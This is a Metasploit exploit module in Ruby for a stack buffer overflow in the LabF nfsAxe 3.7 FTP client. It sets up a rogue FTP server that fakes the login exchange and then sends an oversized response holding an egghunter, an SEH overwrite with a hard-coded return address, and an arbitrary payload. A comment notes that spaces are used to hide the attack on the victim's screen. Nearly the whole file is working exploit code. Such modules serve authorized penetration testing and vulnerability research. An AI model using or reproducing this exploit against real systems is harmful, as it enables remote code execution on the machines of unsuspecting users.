# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking
 
  include Msf::Exploit::Remote::TcpServer
  include Msf::Exploit::Seh
  include Msf::Exploit::Remote::Egghunter
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;LabF nfsAxe 3.7 FTP Client Stack Buffer Overflow&#039;,
      &#039;Description&#039;    => %q{
          This module exploits a buffer overflow in the LabF nfsAxe 3.7 FTP Client allowing remote
          code execution.
        },
      &#039;Author&#039;   =>
        [
          &#039;Tulpa&#039;,           # Original exploit author
          &#039;Daniel Teixeira&#039;  # MSF module author
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [ &#039;EDB&#039;, &#039;42011&#039; ]
        ],
      &#039;Payload&#039;        =>
        {
          &#039;BadChars&#039; => "\x00\x0a\x10",
        },
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Targets&#039;        =>
        [
          # p/p/r in wcmpa10.dll
          [ &#039;Windows Universal&#039;, {&#039;Ret&#039; => 0x6801549F } ]
        ],
      &#039;Privileged&#039;     => false,
      &#039;DefaultOptions&#039; =>
        {
          &#039;SRVHOST&#039; => &#039;0.0.0.0&#039;,
        },
      &#039;DisclosureDate&#039; => &#039;May 15 2017&#039;,
      &#039;DefaultTarget&#039;  => 0))
 
    register_options(
      [
        OptPort.new(&#039;SRVPORT&#039;, [ true, "The FTP port to listen on", 21 ])
      ])
  end
 
  def exploit
    srv_ip_for_client = datastore[&#039;SRVHOST&#039;]
    if srv_ip_for_client == &#039;0.0.0.0&#039;
      if datastore[&#039;LHOST&#039;]
        srv_ip_for_client = datastore[&#039;LHOST&#039;]
      else
        srv_ip_for_client = Rex::Socket.source_address(&#039;50.50.50.50&#039;)
      end
    end
 
    srv_port = datastore[&#039;SRVPORT&#039;]
 
    print_status("Please ask your target(s) to connect to #{srv_ip_for_client}:#{srv_port}")
    super
  end
 
  def on_client_connect(client)
    return if ((p = regenerate_payload(client)) == nil)
    print_status("#{client.peerhost} - connected.")
 
    res = client.get_once.to_s.strip
    print_status("#{client.peerhost} - Request: #{res}") unless res.empty?
    print_status("#{client.peerhost} - Response: Sending 220 Welcome")
    welcome = "220 Welcome.\r\n"
    client.put(welcome)
 
    res = client.get_once.to_s.strip
    print_status("#{client.peerhost} - Request: #{res}")
    print_status("#{client.peerhost} - Response: sending 331 OK")
    user = "331 OK.\r\n"
    client.put(user)
 
    res = client.get_once.to_s.strip
    print_status("#{client.peerhost} - Request: #{res}")
    print_status("#{client.peerhost} - Response: Sending 230 OK")
    pass = "230 OK.\r\n"
    client.put(pass)
    res = client.get_once.to_s.strip
    print_status("#{client.peerhost} - Request: #{res}")
 
    eggoptions = { :checksum => true }
    hunter,egg = generate_egghunter(payload.encoded, payload_badchars, eggoptions)
 
    # "\x20"s are used to make the attack less obvious
    # on the target machine&#039;s screen.
    sploit = "220 \""
    sploit << "\x20"*(9833 - egg.length)
    sploit << egg
    sploit << generate_seh_record(target.ret)
    sploit << hunter
    sploit << "\x20"*(576 - hunter.length)
    sploit << "\" is current directory\r\n"
 
    print_status("#{client.peerhost} - Request: Sending the malicious response")
    client.put(sploit)
 
  end
end

